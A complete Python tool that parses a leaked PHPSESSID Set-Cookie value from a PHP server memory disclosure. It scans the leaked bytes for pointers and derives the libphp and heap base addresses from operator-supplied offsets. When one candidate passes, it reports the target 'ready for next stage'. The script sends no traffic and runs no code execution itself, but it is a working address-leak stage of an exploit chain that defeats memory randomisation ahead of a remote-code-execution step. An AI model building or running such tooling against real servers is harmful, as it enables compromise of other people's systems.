#!/usr/bin/env python3
"""Strict, RCE-free validator for a PHP Set-Cookie memory disclosure.

The tool never sends network traffic. It validates a previously captured B1
response/cookie using target-profile offsets supplied by the operator.

Acceptance requires:
  * a page-consistent zval_ptr_dtor pointer and libphp base;
  * sufficient pointer repetition (or an exact structural position, if given);
  * a 2 MiB-aligned heap base derived with the calibrated heap delta;
  * enough disclosed pointers in that exact heap bucket;
  * every optional extra module anchor to be present.

A passing result is strong consistency evidence, not a mathematical proof.
"""

from __future__ import annotations

import argparse
from collections import Counter, defaultdict
import json
from pathlib import Path
import re
import sys
import urllib.parse

PAGE_MASK = 0xFFF
CHUNK_MASK = ~0x1FFFFF


def integer(value: str) -> int:
    return int(value, 0)


def decode_input(path: Path, input_format: str) -> bytes:
    data = path.read_bytes()
    if input_format == "decoded":
        return data
    if input_format == "response":
        match = re.search(
            rb"(?im)^Set-Cookie:\s*PHPSESSID=([^\r\n;]*)", data
        )
        if not match:
            raise ValueError("no Set-Cookie: PHPSESSID value found in response")
        data = match.group(1)
    else:
        data = data.strip()
        if data.startswith(b"PHPSESSID="):
            data = data[len(b"PHPSESSID="):]
        data = data.split(b";", 1)[0]
    return urllib.parse.unquote_to_bytes(data.decode("latin1"))


def scan_pointers(raw: bytes, lower: int, upper: int):
    positions: dict[int, list[int]] = defaultdict(list)
    # Scan every byte offset: disclosed pointers need not be 8-byte aligned
    # relative to the start of the URL-decoded cookie.
    for offset in range(0, len(raw) - 7):
        value = int.from_bytes(raw[offset:offset + 8], "little")
        if lower <= value < upper:
            positions[value].append(offset)
    counts = Counter({value: len(where) for value, where in positions.items()})
    buckets = Counter()
    for value, count in counts.items():
        buckets[value & CHUNK_MASK] += count
    return positions, counts, buckets


def evaluate(raw: bytes, args: argparse.Namespace) -> dict:
    positions, counts, buckets = scan_pointers(
        raw, args.pointer_min, args.pointer_max
    )
    candidates = []

    for pointer, where in positions.items():
        if (pointer & PAGE_MASK) != (args.dtor_offset & PAGE_MASK):
            continue
        libphp_base = pointer - args.dtor_offset
        if libphp_base <= 0 or (libphp_base & PAGE_MASK):
            continue

        heap_base = libphp_base + args.heap_delta
        heap_count = buckets.get(heap_base, 0)
        structural_match = (
            args.dtor_position is not None
            and args.dtor_position in where
        )
        anchors = []
        for anchor_offset in args.module_anchor:
            expected = libphp_base + anchor_offset
            anchor_count = counts.get(expected, 0)
            anchors.append({
                "offset": anchor_offset,
                "expected_pointer": expected,
                "count": anchor_count,
            })

        reasons = []
        if len(where) < args.min_dtor_count:
            reasons.append(
                f"dtor repetition {len(where)} < {args.min_dtor_count}"
            )
        if args.dtor_position is not None and not structural_match:
            reasons.append(
                f"dtor absent at required cookie offset {args.dtor_position:#x}"
            )
        if heap_base & CHUNK_MASK != heap_base:
            reasons.append("derived heap base is not 2 MiB aligned")
        if heap_count < args.min_heap_count:
            reasons.append(
                f"heap pointer count {heap_count} < {args.min_heap_count}"
            )
        missing_anchors = [a for a in anchors if a["count"] == 0]
        if missing_anchors:
            reasons.append(f"{len(missing_anchors)} required module anchor(s) absent")

        candidates.append({
            "libphp_base": libphp_base,
            "dtor_pointer": pointer,
            "dtor_count": len(where),
            "dtor_positions": where[:32],
            "structural_match": structural_match,
            "heap_base": heap_base,
            "heap_pointer_count": heap_count,
            "module_anchors": anchors,
            "reasons": reasons,
            "valid": not reasons,
        })

    candidates.sort(
        key=lambda c: (
            c["valid"],
            c["structural_match"],
            c["dtor_count"],
            c["heap_pointer_count"],
            sum(a["count"] for a in c["module_anchors"]),
        ),
        reverse=True,
    )
    valid = [c for c in candidates if c["valid"]]

    if len(valid) == 1:
        status = "VALIDATED"
        selected = valid[0]
        failure = None
    elif len(valid) > 1:
        status = "AMBIGUOUS"
        selected = None
        failure = f"{len(valid)} independent candidates passed; refusing to select one"
    else:
        status = "REJECTED"
        selected = None
        failure = "no candidate satisfied every required check"

    top_buckets = [
        {"base": base, "pointer_count": count}
        for base, count in buckets.most_common(8)
    ]
    return {
        "status": status,
        "ready_for_next_stage": status == "VALIDATED",
        "failure": failure,
        "decoded_cookie_length": len(raw),
        "plausible_pointer_values": len(counts),
        "selected": selected,
        "top_heap_buckets": top_buckets,
        "near_candidates": candidates[:args.show_candidates],
    }


def print_human(report: dict) -> None:
    print(f"STATUS={report['status']}")
    print(f"DECODED_COOKIE_LENGTH={report['decoded_cookie_length']}")
    print(f"PLAUSIBLE_POINTER_VALUES={report['plausible_pointer_values']}")
    selected = report["selected"]
    if selected:
        print(f"LIBPHP_BASE={selected['libphp_base']:#x}")
        print(f"HEAP_BASE={selected['heap_base']:#x}")
        print(f"DTOR_POINTER={selected['dtor_pointer']:#x}")
        print(f"DTOR_COUNT={selected['dtor_count']}")
        print(f"HEAP_POINTER_COUNT={selected['heap_pointer_count']}")
        print(f"STRUCTURAL_POSITION_MATCH={selected['structural_match']}")
        print("READY_FOR_NEXT_STAGE=yes")
    else:
        print("READY_FOR_NEXT_STAGE=no")
        print(f"REASON={report['failure']}")
        for index, candidate in enumerate(report["near_candidates"], 1):
            print(
                f"CANDIDATE_{index}=libphp:{candidate['libphp_base']:#x} "
                f"heap:{candidate['heap_base']:#x} "
                f"dtor_count:{candidate['dtor_count']} "
                f"heap_count:{candidate['heap_pointer_count']}"
            )
            for reason in candidate["reasons"]:
                print(f"  - {reason}")


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Validate leaked libphp/heap addresses without sending traffic or running RCE."
    )
    parser.add_argument("input", type=Path, help="captured response, cookie, or decoded binary file")
    parser.add_argument(
        "--input-format", choices=("response", "cookie", "decoded"),
        default="response", help="input type (default: response)"
    )
    parser.add_argument("--dtor-offset", type=integer, required=True,
                        help="target-profile zval_ptr_dtor image offset")
    parser.add_argument("--heap-delta", type=integer, required=True,
                        help="calibrated heap_main_chunk - libphp_base delta")
    parser.add_argument("--dtor-position", type=integer,
                        help="optional required position of dtor pointer in decoded cookie, e.g. 0x8")
    parser.add_argument("--module-anchor", type=integer, action="append", default=[],
                        help="optional additional module offset that must also appear; repeatable")
    parser.add_argument("--min-dtor-count", type=int, default=2,
                        help="minimum repeated dtor occurrences (default: 2)")
    parser.add_argument("--min-heap-count", type=int, default=4,
                        help="minimum pointers in derived heap bucket (default: 4)")
    parser.add_argument("--pointer-min", type=integer, default=0x100000000,
                        help="inclusive candidate pointer floor (default: %(default)#x)")
    parser.add_argument("--pointer-max", type=integer, default=0x800000000000,
                        help="exclusive candidate pointer ceiling (default: %(default)#x)")
    parser.add_argument("--show-candidates", type=int, default=5,
                        help="near candidates shown on failure (default: 5)")
    parser.add_argument("--json", action="store_true", help="emit machine-readable JSON")
    args = parser.parse_args()

    if args.min_dtor_count < 1 or args.min_heap_count < 1:
        parser.error("minimum counts must be positive")
    if args.pointer_min >= args.pointer_max:
        parser.error("pointer-min must be below pointer-max")

    try:
        raw = decode_input(args.input, args.input_format)
        report = evaluate(raw, args)
    except (OSError, ValueError, UnicodeError) as exc:
        print(f"INPUT_ERROR={exc}", file=sys.stderr)
        return 1

    if args.json:
        print(json.dumps(report, indent=2))
    else:
        print_human(report)
    return 0 if report["ready_for_next_stage"] else 2


if __name__ == "__main__":
    raise SystemExit(main())
